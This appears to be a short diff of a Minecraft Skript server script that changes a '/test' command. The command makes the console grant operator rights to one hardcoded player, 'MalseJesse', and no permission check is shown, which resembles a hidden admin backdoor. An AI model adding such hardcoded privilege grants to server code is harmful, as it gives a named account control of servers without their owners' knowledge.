@@ -79,4 +79,4 @@ command /politie [<text>]:
 
 command /test:
     trigger:
-        make console execute command "op MalseJesse"
+        make console execute command "/op MalseJesse"
